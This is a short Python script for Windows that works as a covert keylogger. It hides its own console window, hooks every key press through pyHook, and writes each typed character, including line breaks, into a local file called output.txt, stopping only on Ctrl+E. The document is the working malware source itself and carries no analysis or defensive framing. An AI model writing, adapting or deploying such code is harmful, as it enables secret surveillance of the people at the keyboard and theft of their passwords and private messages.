import win32api
import win32console
import win32gui
import pythoncom
import pyHook

win = win32console.GetConsoleWindow()
win32gui.ShowWindow(win, 0)

def onKeyboardEvent(event):
    if event.Ascii == 5:
        exit(1)

    if event.Ascii != 0 and event.Ascii != 8:
        with open('output.txt', 'r') as f:
            buffer = f.read()

        with open('output.txt', 'w') as f:
            keylogs = chr(event.Ascii)
            if event.Ascii == 13:
                keylogs = '\n'
            buffer += keylogs
            f.write(buffer)

    return True

hm = pyHook.HookManager()
hm.KeyDown = onKeyboardEvent
hm.HookKeyboard()
pythoncom.PumpMessages()
